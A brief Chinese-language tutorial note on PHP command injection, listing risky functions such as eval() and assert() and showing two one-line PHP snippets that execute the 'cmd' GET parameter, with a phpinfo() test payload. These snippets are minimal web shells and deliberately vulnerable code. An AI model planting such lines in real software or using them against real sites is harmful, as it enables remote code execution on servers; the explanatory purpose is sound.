命令注入

命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做系统命令执行。

常用函数

eval(),assert(),preg_replace(), create_function(), call_user_func(), call_user_func_array()，array_map()，反引号() 等函数

eval(),assert()

<?php@eval($_GET["cmd"]);?>
<?php @assert($_GET["cmd"]);?>
payload: xxx.php?cmd=phpinfo(); 这里没有任何过滤，可以执行任意命令
